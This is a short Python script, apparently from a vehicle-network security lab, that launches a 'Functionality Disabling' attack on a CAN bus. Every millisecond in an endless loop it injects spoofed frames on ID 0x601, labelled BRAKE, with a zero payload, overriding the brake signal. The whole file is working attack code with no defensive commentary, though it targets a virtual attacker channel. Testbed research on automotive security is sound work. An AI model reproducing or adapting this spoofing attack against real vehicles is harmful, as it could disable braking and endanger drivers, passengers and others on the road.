import can
import time

from can_network import VCAN_ATTACKER_CHANNEL, CAN_INTERFACE

TARGET_ID = 0x601
NEUTRAL_PAYLOAD = [0x00, 0x00, 0x00, 0x00]  # brake = 0, matches BRAKE's 4-byte DLC
PERIOD = 0.001

def main():
    print("Conducting Functionality Disabling attack on CAN bus...")
    bus = can.interface.Bus(channel=VCAN_ATTACKER_CHANNEL, interface=CAN_INTERFACE)
    try:
        while True:
            msg = can.Message(arbitration_id=TARGET_ID, data=NEUTRAL_PAYLOAD, is_extended_id=False)
            bus.send(msg)
            print(f"Overwriting BRAKE (ID=0x{TARGET_ID:03X}) with neutral payload (brake=0)")
            time.sleep(PERIOD)
    except KeyboardInterrupt:
        print("Functionality Disabling attack stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
